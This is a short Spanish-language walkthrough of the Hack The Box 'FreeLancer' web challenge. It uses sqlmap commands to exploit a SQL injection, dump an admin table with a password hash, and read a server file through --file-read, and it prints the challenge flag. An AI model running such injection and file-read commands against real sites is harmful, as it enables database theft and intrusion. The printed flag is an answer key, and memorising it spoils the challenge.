@@ -1,0 +1,21 @@
+HACK THE BOX 
+-- WEB PENETRATION TESTING ---
+
+1. FreeLancer [by IhsanSencan]
+
+Can you test how secure my website is? Prove me wrong and capture the flag!
+
+165.232.37.60:31429
+
+1.1 - inspeccionar la web en busca de alguna vulnerabilidad --> http://134.122.109.72:31429/portfolio.php
+1.2 - http://134.122.109.72:31429/portfolio.php?id=1 --> posibilidad de inyeccion sql
+1.3 - analizamos con sqlmap --> sqlmap http://134.122.109.72:31429/portfolio.php?id=1 --tables
+1.4 - encontramos el nombre de la base de datos "freelancer", la tabla "safeadmin" y mas informacion.
+1.5 - escaneamos la tabla safeadmin -> sqlmap http://134.122.109.72:31429/portfolio.php?id=1 -T safeadmin --dump 
+1.6 - encontramos:  1  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | safeadm  | 2019-07-16 20:25:45 
+1.7 - sqlmap -u  http://134.122.109.72:31429/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php
+1.8 - accedemos al archivo de adiministrador descargando una copia en nuestro ordenador, en la cual al visualizarla encontramos la bandera!
+---- <h1>HTB{s4ff_3_1_w33b_fr4__l33nc_3}</h1> -----
+
+
+
